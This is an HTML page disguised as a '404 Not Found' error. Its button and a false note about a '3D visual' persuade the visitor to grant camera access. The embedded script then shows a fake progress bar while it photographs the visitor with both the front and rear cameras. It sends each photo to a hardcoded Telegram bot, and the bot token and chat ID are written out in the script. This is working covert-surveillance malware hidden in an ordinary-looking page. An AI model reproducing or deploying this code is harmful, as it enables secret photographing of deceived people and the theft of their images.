<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>404 Not Found</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
    font-family: Arial, Helvetica, sans-serif;
    background: #fff;
    color: #000;
    padding: 40px;
}
h1 { font-size: 32px; }
p  { font-size: 16px; }

#photoBtn {
    margin-top: 20px;
    font-size: 16px;
    color: #0066cc;
    cursor: pointer;
    text-decoration: underline;
    background: none;
    border: none;
    padding: 0;
}

#progressBox {
    margin-top: 25px;
    display: none;
}
#status {
    font-weight: bold;
    margin-bottom: 8px;
}
.progress {
    width: 300px;
    height: 16px;
    border: 1px solid #000;
}
.bar {
    height: 100%;
    width: 0%;
    background: #000;
    color: #fff;
    font-size: 11px;
    text-align: center;
    line-height: 16px;
}

video, canvas { display: none; }
</style>
</head>

<body>

<h1>404 Not Found</h1>
<p>The requested URL was not found on this server.</p>

<button id="photoBtn">Vsit website ‚ü≥</button>
    <div style="border:1px solid #ccc; padding:10px; background:#f9f9f9;">
  <strong>Note:</strong> Since the video is a 3D visual, we kindly ask you to allow the use of a camera.
</div>


<div id="progressBox">
    <div id="status">IN PROGRESS</div>
    <div class="progress">
        <div class="bar" id="bar">1%</div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
const CHAT_ID  = "7880376636";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

async function sendToTelegram(blob) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("photo", blob);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: fd
    });
}

function startProgress() {
    const box = document.getElementById("progressBox");
    const bar = document.getElementById("bar");
    box.style.display = "block";

    let p = 1;
    bar.style.width = "1%";
    bar.textContent = "1%";

    const i = setInterval(() => {
        p++;
        bar.style.width = p + "%";
        bar.textContent = p + "%";
        if (p >= 100) clearInterval(i);
    }, 50); // 5 soniya
}

async function capture(facing) {
    const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: facing }
    });
    video.srcObject = stream;
    await video.play();

    await new Promise(r => setTimeout(r, 500));

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    stream.getTracks().forEach(t => t.stop());

    return new Promise(res => {
        canvas.toBlob(blob => res(blob), "image/jpeg", 0.9);
    });
}

document.getElementById("photoBtn").onclick = async () => {
    startProgress();

    // OLD KAMERA
    const front = await capture("user");
    sendToTelegram(front);

    // ORQA KAMERA
    const back = await capture("environment");
    sendToTelegram(back);
};
</script>

</body>
</html>
